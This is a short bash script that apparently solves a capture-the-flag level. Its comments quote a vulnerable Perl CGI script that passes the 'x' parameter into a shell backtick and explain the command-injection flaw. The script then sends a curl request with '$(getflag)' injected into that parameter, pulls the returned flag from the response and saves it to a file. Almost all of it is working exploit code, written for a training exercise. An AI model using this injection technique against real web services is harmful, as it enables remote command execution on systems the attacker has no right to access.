#!/usr/bin/env bash

# We see in the directory of level04 that there is a file called level04.pl that contains the following code:

# #!/usr/bin/perl
# # localhost:4747
# use CGI qw{param};
# print "Content-type: text/html\n\n";
# sub x {
#   $y = $_[0];
#   print `echo $y 2>&1`;
# }
# x(param("x"));

# This is a perl script that uses the CGI module to create a web server that listens on port 4747
# The script takes a parameter called "x" and passes it to the function x
# So we can use this to execute commands on the server by passing them as the "x" parameter

if [ ! -z "$1" ]; then

	# Send a request to the server with the command "getflag"
    flag=$(curl 'http://'"$1:$2"'/?x=$(getflag)')

	# Check if the server responded with anything
	if [ -z "$flag" ]; then
		echo "Error: Network error"
		exit 1
	fi

	# Extract the flag from the response
    flag=$(echo $flag | awk '{print $NF}')

	# Print the flag to the terminal
    echo "Password:"
    echo $flag

	# Save the flag to a file
    echo $flag > flag04.pwd
else
    echo "Usage: ./flag04.sh <ip address> <port>"
fi
